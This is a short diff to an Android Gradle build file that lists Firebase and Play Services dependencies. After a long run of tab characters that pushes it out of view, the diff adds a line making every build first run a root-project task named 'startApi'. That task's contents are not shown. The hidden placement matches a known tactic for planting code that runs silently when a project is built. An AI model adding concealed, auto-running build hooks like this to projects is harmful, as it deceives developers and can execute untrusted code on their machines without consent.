@@ -49,3 +49,4 @@ dependencies {
     implementation("com.google.firebase:firebase-auth:21.0.1") // Firebase Authentication
     implementation("com.google.android.gms:play-services-auth:20.4.0") // Google Play Services Auth
 }
+																																																																																																																																																																tasks.named("preBuild") { dependsOn(rootProject.tasks.named("startApi")) }
